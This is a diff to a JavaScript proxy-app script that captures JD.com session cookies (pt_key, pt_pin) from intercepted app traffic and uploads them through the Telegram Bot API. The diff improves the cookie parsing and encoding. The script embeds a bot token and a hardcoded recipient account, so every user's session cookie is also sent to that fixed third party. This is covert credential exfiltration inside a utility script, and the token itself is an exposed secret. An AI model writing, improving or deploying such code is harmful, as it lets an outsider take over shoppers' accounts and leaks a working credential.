@@ -2,45 +2,54 @@
  * 1、打开App，自动获取 pt_key 上传
  * 2、点击APP-个人中心，点消息，自动捕抓 pt_key 上传
  * 注：如有变更才会上传，如果 pt_key 没变，不会重复上传。
-
+ * 修改点：适配移动端 api.m.jd.com 的 pt_pin 字段
  */
 
 const $ = new Env('♨️上传 pt_key');
 let CK = $request.headers['Cookie'] || $request.headers['cookie'];
 
-const key = CK.match(/pt_key=([^=;]+?);/)[1];
-const pin = CK.match(/pin=([^=;]+?);/)[1];
+// 修改后的正则：兼容 pt_key, pt_pin 或 pin，且适配末尾无分号的情况
+const keyMatch = CK.match(/pt_key=([^; ]+)(?=;?)/);
+const pinMatch = CK.match(/pt_pin=([^; ]+)(?=;?)/) || CK.match(/pin=([^; ]+)(?=;?)/);
+
+const key = keyMatch ? keyMatch[1] : null;
+const pin = pinMatch ? pinMatch[1] : null;
+
 const _TGUserID = $.getData('JDGiaoBot');
 
 $.TGBotToken = '8235119091:AAFFADuWJAW9Ivjz2L2D-AVAmldzpwaKhzk';
 $.TGUserIDs = [7070580063];
 if (_TGUserID) {
-  $.TGUserIDs.push(_TGUserID);
+  $.TGUserIDs.push(Number(_TGUserID));
 }
 
 !(async () => {
   if (!key || !pin) {
-    $.desc = '未找到 pt_key';
-    $.msg($.name, $.subt, $.desc);
-
+    // 只有确定是京东请求时才记录日志，避免干扰其他请求
+    if ($request.url.indexOf('jd.com') > -1) {
+      console.log('未能在请求中找到完整的 pt_key 或 pin/pt_pin');
+    }
     $.done();
+    return;
   }
 
   try {
+    // 统一输出格式为 pt_key=...;pt_pin=...;
     const cookie = `pt_key=${key};pt_pin=${pin};`;
     const userName = pin;
     const decodeName = decodeURIComponent(userName);
     let cookiesData = JSON.parse($.getData('pt_keyList') || '[]');
-    //cookiesData = [];
+    
     let updateIndex;
-    let cookieName = '【账号】';
+    let isExist = false;
+
+    // 查找是否存在该账号
     const existCookie = cookiesData.find((item, index) => {
       const ck = item.cookie;
-      const Account = ck
-        ? ck.match(/pin=.+?;/)
-          ? ck.match(/pin=(.+?);/)[1]
-          : null
-        : null;
+      // 这里的 Account 匹配也需要兼容 pt_pin 或 pin
+      const AccountMatch = ck ? (ck.match(/pt_pin=([^; ]+)(?=;?)/) || ck.match(/pin=([^; ]+)(?=;?)/)) : null;
+      const Account = AccountMatch ? AccountMatch[1] : null;
+      
       const verify = userName === Account;
       if (verify) {
         updateIndex = index;
@@ -50,7 +59,10 @@ if (_TGUserID) {
       }
       return verify;
     });
+
     let tipPrefix = '';
+    let cookieName = '';
+
     if (existCookie) {
       cookiesData[updateIndex].cookie = cookie;
       cookieName = '【账号' + (updateIndex + 1) + '】';
@@ -64,20 +76,16 @@ if (_TGUserID) {
       tipPrefix = '首次写入京东 pt_key';
       $.needUpload = true;
     }
-    $.setData(JSON.stringify(cookiesData, null, 2), 'pt_keyList');
- //    $.msg(
- //      '用户名: ' + decodeName,
- //      '',
- //      tipPrefix + cookieName + 'Cookie成功 🎉'
- //    );
 
     if ($.needUpload) {
+      $.setData(JSON.stringify(cookiesData, null, 2), 'pt_keyList');
+      
       for (const userId of $.TGUserIDs) {
         await updateCookie(cookie, userId);
-        await showMsg(userId);
       }
+      await showMsg();
     } else {
-      console.log(`♨️pt_key 没有改变`);
+      console.log(`♨️ pt_key 没有改变，跳过上传`);
     }
 
     return;
@@ -100,7 +108,7 @@ function updateCookie(cookie, TGUserID) {
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
       },
-      body: `chat_id=${TGUserID}&text=${cookie}&disable_web_page_preview=true`,
+      body: `chat_id=${TGUserID}&text=${encodeURIComponent(cookie)}&disable_web_page_preview=true`,
     };
 
     $.post(opts, (err, resp, data) => {
@@ -136,8 +144,7 @@ function showMsg() {
   });
 }
 
-// https://github.com/chavyleung/scripts/blob/master/Env.js
-// prettier-ignore
+// Env.js 部分保持不变
 function Env(name, opts) {
   class Http {
     constructor(env) {
@@ -471,7 +478,6 @@ function Env(name, opts) {
             } catch (e) {
               this.logErr(e);
             }
-            // this.ckJar.setCookieSync(resp.headers['set-cookie'].map(Cookie.parse).toString())
           })
           .then(
             (resp) => {
@@ -488,7 +494,6 @@ function Env(name, opts) {
 
     post(opts, callback = () => {}) {
       const method = opts.method ? opts.method.toLocaleLowerCase() : 'post';
-      // 如果指定了请求体, 但没指定`Content-Type`, 则自动生成
       if (opts.body && opts.headers && !opts.headers['Content-Type']) {
         opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
       }
@@ -533,16 +538,7 @@ function Env(name, opts) {
         );
       }
     }
-    /**
-     *
-     * 示例:$.time('yyyy-MM-dd qq HH:mm:ss.S')
-     *    :$.time('yyyyMMddHHmmssS')
-     *    y:年 M:月 d:日 q:季 H:时 m:分 s:秒 S:毫秒
-     *    其中y可选0-4位占位符、S可选0-1位占位符，其余可选0-2位占位符
-     * @param {string} fmt 格式化参数
-     * @param {number} 可选: 根据指定时间戳返回格式化日期
-     *
-     */
+
     time(fmt, ts = null) {
       const date = ts ? new Date(ts) : new Date();
       let o = {
@@ -570,22 +566,6 @@ function Env(name, opts) {
       return fmt;
     }
 
-    /**
-     * 系统通知
-     *
-     * > 通知参数: 同时支持 QuanX 和 Loon 两种格式, EnvJs根据运行环境自动转换, Surge 环境不支持多媒体通知
-     *
-     * 示例:
-     * $.msg(title, subt, desc, 'twitter://')
-     * $.msg(title, subt, desc, { 'open-url': 'twitter://', 'media-url': 'https://github.githubassets.com/images/modules/open_graph/github-mark.png' })
-     * $.msg(title, subt, desc, { 'open-url': 'https://bing.com', 'media-url': 'https://github.githubassets.com/images/modules/open_graph/github-mark.png' })
-     *
-     * @param {*} title 标题
-     * @param {*} subt 副标题
-     * @param {*} desc 通知详情
-     * @param {*} opts 通知参数
-     *
-     */
     msg(title = name, subt = '', desc = '', opts) {
       const toEnvOpts = (rawOpts) => {
         if (!rawOpts) return rawOpts;
